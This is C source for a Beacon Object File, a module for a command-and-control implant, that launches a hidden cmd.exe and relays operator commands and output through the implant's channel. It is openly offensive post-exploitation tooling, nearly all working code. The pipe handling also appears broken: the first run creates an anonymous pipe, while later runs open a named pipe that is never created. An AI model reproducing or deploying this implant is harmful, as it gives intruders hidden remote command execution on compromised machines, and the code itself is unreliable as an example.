/*
 * reverse_shell.c: Interactive shell BOF
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -I ../Beacon/include/coff -c reverse_shell.c -o reverse_shell.x64.o
 *
 * Usage:
 *   1) First run (no args): creates pipe + spawns shell
 *   2) Subsequent runs with args: sends command + reads output
 *   3) Subsequent runs without args: reads only pending output
 *
 * Dual-mode design: single BOF acts as both writer and reader.
 * We need to rework this to use the Persistence API
 */

#include <stdbool.h>

 #include "../Beacon/include/coff/beacon_compatibility.h"

HANDLE WINAPI kernel32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL   WINAPI kernel32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
BOOL   WINAPI kernel32$CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
BOOL   WINAPI kernel32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
BOOL   WINAPI kernel32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
BOOL   WINAPI kernel32$PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
BOOL   WINAPI kernel32$SetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags);
DWORD  WINAPI kernel32$GetLastError(VOID);
VOID   WINAPI kernel32$Sleep(DWORD dwMilliseconds);
BOOL   WINAPI kernel32$CloseHandle(HANDLE hObject);
LPVOID WINAPI kernel32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL   WINAPI kernel32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
SIZE_T WINAPI msvcrt$wcslcat(wchar_t *dest, const wchar_t *src, SIZE_T count);
SIZE_T WINAPI msvcrt$wcslen(const wchar_t *str);
VOID * WINAPI msvcrt$memset(void *dest, int c, SIZE_T count);

/* Compile-time random pipe name - can eventually be patched by server */
const wchar_t PIPE_NAME[] = L"\\\\.\\pipe\\pd_7a2f9c4e1b";

#define READ_BUFFER_SIZE 8192

void go(char *args, int alen)
{
    HANDLE hPipe = NULL;
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    BOOL success = FALSE;
    char *readBuffer = NULL;

    readBuffer = (char *)kernel32$VirtualAlloc(NULL, READ_BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!readBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "reverse_shell: failed to allocate read buffer");
        return;
    }
    msvcrt$memset(readBuffer, 0, READ_BUFFER_SIZE);

    /* Detect first run by attempting to open existing pipe */
    hPipe = kernel32$CreateFileW(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    BOOL isFirstRun = (hPipe == INVALID_HANDLE_VALUE && kernel32$GetLastError() == ERROR_FILE_NOT_FOUND);

    if (isFirstRun) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] reverse_shell: first run, initializing shell environment");

        SECURITY_ATTRIBUTES saAttr = {0};
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        HANDLE hPipeRead = NULL, hPipeWrite = NULL;
        if (!kernel32$CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "reverse_shell: CreatePipe failed (error %lu)", kernel32$GetLastError());
            goto cleanup;
        }

        kernel32$SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(STARTUPINFOW);
        si.dwFlags = STARTF_USESTDHANDLES; //| STARTF_USESHOWWINDOW;
        si.hStdInput = hPipeRead;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        si.wShowWindow = SW_HIDE;

        wchar_t cmdLine[] = L"cmd.exe";

        success = kernel32$CreateProcessW(
            NULL,
            cmdLine,
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );

        if (!success) {
            BeaconPrintf(CALLBACK_ERROR, "reverse_shell: CreateProcessW failed (error %lu)", kernel32$GetLastError());
            kernel32$CloseHandle(hPipeRead);
            kernel32$CloseHandle(hPipeWrite);
            goto cleanup;
        }

        kernel32$CloseHandle(pi.hProcess);
        kernel32$CloseHandle(pi.hThread);
        kernel32$CloseHandle(hPipeRead);

        BeaconPrintf(CALLBACK_OUTPUT, "[+] reverse_shell: shell initialized successfully");
        goto cleanup;
    }

    /* Pipe already exists - we are in subsequent run mode */
    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "reverse_shell: failed to connect to pipe (error %lu)", kernel32$GetLastError());
        goto cleanup;
    }

    /* If we received arguments, write command to pipe */
    if (args && alen > 0) {
        success = kernel32$WriteFile(hPipe, args, alen, &bytesWritten, NULL);
        if (success && bytesWritten > 0) {
            /* Write newline to flush command */
            char newline = '\n';
            kernel32$WriteFile(hPipe, &newline, 1, &bytesWritten, NULL);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "reverse_shell: failed to write command to pipe");
        }
        /* Small delay to let shell process command */
        kernel32$Sleep(50);
    }

    /* Read any available output */
    while (TRUE) {
        success = kernel32$PeekNamedPipe(hPipe, NULL, 0, NULL, &bytesAvailable, NULL);
        if (!success || bytesAvailable == 0) {
            break;
        }

        DWORD toRead = (bytesAvailable < READ_BUFFER_SIZE - 1) ? bytesAvailable : (READ_BUFFER_SIZE - 1);
        success = kernel32$ReadFile(hPipe, readBuffer, toRead, &bytesRead, NULL);

        if (success && bytesRead > 0) {
            readBuffer[bytesRead] = '\0';
            BeaconOutput(CALLBACK_OUTPUT, readBuffer, bytesRead);
        } else {
            break;
        }
    }

cleanup:
    if (hPipe != INVALID_HANDLE_VALUE && hPipe != NULL) {
        kernel32$CloseHandle(hPipe);
    }
    if (readBuffer) {
        kernel32$VirtualFree(readBuffer, 0, MEM_RELEASE);
    }
}
